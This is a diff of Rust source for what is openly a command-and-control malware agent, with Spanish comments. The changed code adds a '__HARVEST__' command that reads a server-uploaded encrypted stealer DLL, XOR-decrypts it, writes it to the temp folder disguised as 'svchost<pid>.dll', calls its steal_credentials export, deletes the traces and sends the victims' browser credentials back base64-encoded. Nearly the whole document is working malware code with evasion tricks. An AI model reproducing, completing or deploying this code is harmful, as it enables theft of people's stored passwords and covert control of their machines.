@@ -14,10 +14,6 @@ use std::path::Path;
 
 const DELIMITER: &str = "\n<<END>>\n";
 
-// DLL encriptada del stealer (generada por el builder)
-const ENCRYPTED_DLL: &[u8] = include_bytes!("../encrypted_stealer.bin");
-const DLL_KEY: &[u8] = include_bytes!("../dll_key.bin");
-
 fn main() {
     println!("DEBUG: C2R2 Agent v2.0 - Direct Connection");
     println!("DEBUG: Conectando a {}", config::C2_SERVER);
@@ -68,10 +64,10 @@ fn handle_connection(stream: TcpStream) {
                     let response = upload_file(command);
                     writer.write_all(response.as_bytes()).ok();
                     writer.flush().ok();
-                } else if command == "__STEAL__" {
-                    // Comando para robar credenciales de browsers
-                    println!("DEBUG: Robando credenciales de browsers...");
-                    let response = steal_browser_credentials();
+                } else if command == "__HARVEST__" {
+                    // Comando para robar credenciales usando DLL encriptada
+                    println!("DEBUG: Harvesting credenciales...");
+                    let response = harvest_credentials();
                     writer.write_all(response.as_bytes()).ok();
                     writer.flush().ok();
                 } else if !command.is_empty() {
@@ -258,105 +254,135 @@ fn base64_decode(data: &str) -> Result<Vec<u8>, String> {
     Ok(result)
 }
 
-/// Roba credenciales de browsers cargando la DLL encriptada
-#[cfg(target_os = "windows")]
-fn steal_browser_credentials() -> String {
-    use std::os::raw::c_char;
+/// Roba credenciales de browsers usando DLL encriptada
+/// El servidor ya subió stealer.enc y stealer.key con /upload
+/// Ahora solo cargamos, desencriptamos y ejecutamos
+fn harvest_credentials() -> String {
+    println!("DEBUG: Harvesting credentials...");
     
-    println!("DEBUG: Desencriptando DLL de stealer...");
-    
-    // 1. Desencriptar DLL con XOR
-    let dll_bytes = xor_decrypt(ENCRYPTED_DLL, DLL_KEY);
-    println!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
-    
-    // 2. Escribir DLL temporalmente (Windows no permite LoadLibrary desde memoria fácilmente)
-    let temp_dir = std::env::temp_dir();
-    let dll_path = temp_dir.join(format!("svchost{}.dll", std::process::id()));
-    
-    if let Err(e) = fs::write(&dll_path, &dll_bytes) {
-        return format!("__ERROR__:Error escribiendo DLL temporal: {}{}", e, DELIMITER);
+    #[cfg(not(target_os = "windows"))]
+    {
+        return format!("__ERROR__:Harvest solo soportado en Windows{}", DELIMITER);
     }
     
-    println!("DEBUG: DLL temporal: {}", dll_path.display());
-    
-    // 3. Cargar DLL y ejecutar función
-    let result = unsafe {
-        use winapi::um::libloaderapi::{LoadLibraryW, GetProcAddress, FreeLibrary};
-        use std::ffi::OsStr;
-        use std::os::windows::ffi::OsStrExt;
-        
-        // Convertir ruta a wide string
-        let wide_path: Vec<u16> = OsStr::new(dll_path.to_str().unwrap())
-            .encode_wide()
-            .chain(Some(0))
-            .collect();
-        
-        let dll_handle = LoadLibraryW(wide_path.as_ptr());
-        if dll_handle.is_null() {
-            fs::remove_file(&dll_path).ok();
-            return format!("__ERROR__:Error cargando DLL (LoadLibrary failed){}", DELIMITER);
+    #[cfg(target_os = "windows")]
+    {
+        // Verificar que existan los archivos subidos
+        if !Path::new("stealer.enc").exists() {
+            return format!("__ERROR__:stealer.enc no encontrado. El servidor debe subirlo primero.{}", DELIMITER);
         }
         
-        println!("DEBUG: DLL cargada exitosamente");
+        if !Path::new("stealer.key").exists() {
+            return format!("__ERROR__:stealer.key no encontrado. El servidor debe subirlo primero.{}", DELIMITER);
+        }
         
-        // Obtener función steal_credentials
-        let func_name = b"steal_credentials\0";
-        let steal_fn_ptr = GetProcAddress(dll_handle, func_name.as_ptr() as *const i8);
+        // Leer archivos
+        let encrypted_dll = match fs::read("stealer.enc") {
+            Ok(data) => data,
+            Err(e) => return format!("__ERROR__:Error leyendo stealer.enc: {}{}", e, DELIMITER),
+        };
         
-        if steal_fn_ptr.is_null() {
+        let xor_key = match fs::read("stealer.key") {
+            Ok(data) => data,
+            Err(e) => return format!("__ERROR__:Error leyendo stealer.key: {}{}", e, DELIMITER),
+        };
+        
+        println!("DEBUG: DLL encriptada: {} bytes", encrypted_dll.len());
+        println!("DEBUG: Clave XOR: {} bytes", xor_key.len());
+        
+        // Desencriptar DLL
+        let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
+        println!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
+        
+        // Escribir DLL temporal
+        let temp_dir = std::env::temp_dir();
+        let dll_path = temp_dir.join(format!("svchost{}.dll", std::process::id()));
+        
+        if let Err(e) = fs::write(&dll_path, &dll_bytes) {
+            return format!("__ERROR__:Error escribiendo DLL temporal: {}{}", e, DELIMITER);
+        }
+        
+        println!("DEBUG: DLL temporal: {}", dll_path.display());
+        
+        // Cargar DLL y ejecutar
+        let result = unsafe {
+            use winapi::um::libloaderapi::{LoadLibraryW, GetProcAddress, FreeLibrary};
+            use std::ffi::OsStr;
+            use std::os::windows::ffi::OsStrExt;
+            use std::os::raw::c_char;
+            
+            // Convertir ruta a wide string
+            let wide_path: Vec<u16> = OsStr::new(dll_path.to_str().unwrap())
+                .encode_wide()
+                .chain(Some(0))
+                .collect();
+            
+            let dll_handle = LoadLibraryW(wide_path.as_ptr());
+            if dll_handle.is_null() {
+                fs::remove_file(&dll_path).ok();
+                return format!("__ERROR__:Error cargando DLL (LoadLibrary failed){}", DELIMITER);
+            }
+            
+            println!("DEBUG: DLL cargada exitosamente");
+            
+            // Obtener función steal_credentials
+            let func_name = b"steal_credentials\0";
+            let fn_ptr = GetProcAddress(dll_handle, func_name.as_ptr() as *const i8);
+            
+            if fn_ptr.is_null() {
+                FreeLibrary(dll_handle);
+                fs::remove_file(&dll_path).ok();
+                return format!("__ERROR__:Función steal_credentials no encontrada{}", DELIMITER);
+            }
+            
+            // Ejecutar función
+            let exec_fn: extern "C" fn() -> *mut c_char = std::mem::transmute(fn_ptr);
+            let result_ptr = exec_fn();
+            
+            if result_ptr.is_null() {
+                FreeLibrary(dll_handle);
+                fs::remove_file(&dll_path).ok();
+                return format!("__ERROR__:steal_credentials retornó NULL{}", DELIMITER);
+            }
+            
+            // Leer resultado
+            let result_str = CStr::from_ptr(result_ptr).to_string_lossy().to_string();
+            
+            // Liberar memoria
+            let free_func_name = b"free_credentials_string\0";
+            let free_fn_ptr = GetProcAddress(dll_handle, free_func_name.as_ptr() as *const i8);
+            if !free_fn_ptr.is_null() {
+                let free_fn: extern "C" fn(*mut c_char) = std::mem::transmute(free_fn_ptr);
+                free_fn(result_ptr);
+            }
+            
+            // Cerrar DLL
             FreeLibrary(dll_handle);
-            fs::remove_file(&dll_path).ok();
-            return format!("__ERROR__:Función steal_credentials no encontrada{}", DELIMITER);
+            
+            result_str
+        };
+        
+        // Eliminar DLL temporal
+        fs::remove_file(&dll_path).ok();
+        
+        // Eliminar archivos del módulo
+        fs::remove_file("stealer.enc").ok();
+        fs::remove_file("stealer.key").ok();
+        
+        println!("DEBUG: Resultado obtenido: {} bytes", result.len());
+        
+        // Verificar si hubo error
+        if result.starts_with("ERROR:") {
+            return format!("__ERROR__:{}{}", result, DELIMITER);
         }
         
-        // Ejecutar función
-        let steal_fn: extern "C" fn() -> *mut c_char = std::mem::transmute(steal_fn_ptr);
-        let creds_ptr = steal_fn();
-        
-        if creds_ptr.is_null() {
-            FreeLibrary(dll_handle);
-            fs::remove_file(&dll_path).ok();
-            return format!("__ERROR__:steal_credentials retornó NULL{}", DELIMITER);
-        }
-        
-        // Leer resultado
-        let creds_str = CStr::from_ptr(creds_ptr).to_string_lossy().to_string();
-        
-        // Liberar string (llamar a free_credentials_string)
-        let free_func_name = b"free_credentials_string\0";
-        let free_fn_ptr = GetProcAddress(dll_handle, free_func_name.as_ptr() as *const i8);
-        if !free_fn_ptr.is_null() {
-            let free_fn: extern "C" fn(*mut c_char) = std::mem::transmute(free_fn_ptr);
-            free_fn(creds_ptr);
-        }
-        
-        // Cerrar DLL
-        FreeLibrary(dll_handle);
-        
-        creds_str
-    };
-    
-    // 4. Eliminar DLL temporal
-    fs::remove_file(&dll_path).ok();
-    
-    println!("DEBUG: Credenciales obtenidas: {} bytes", result.len());
-    
-    // 5. Verificar si hubo error
-    if result.starts_with("ERROR:") {
-        return format!("__ERROR__:{}{}", result, DELIMITER);
+        // Codificar en Base64 y enviar
+        let encoded = base64_encode(result.as_bytes());
+        format!("__CREDENTIALS_B64__:{}{}", encoded, DELIMITER)
     }
-    
-    // 6. Codificar en Base64 y enviar
-    let encoded = base64_encode(result.as_bytes());
-    format!("__CREDENTIALS_B64__:{}{}", encoded, DELIMITER)
 }
 
-#[cfg(not(target_os = "windows"))]
-fn steal_browser_credentials() -> String {
-    format!("__ERROR__:Stealer solo soportado en Windows{}", DELIMITER)
-}
-
-/// Desencripta datos con XOR (igual que en builder)
+/// Desencripta datos con XOR
 fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
     data.iter()
         .enumerate()
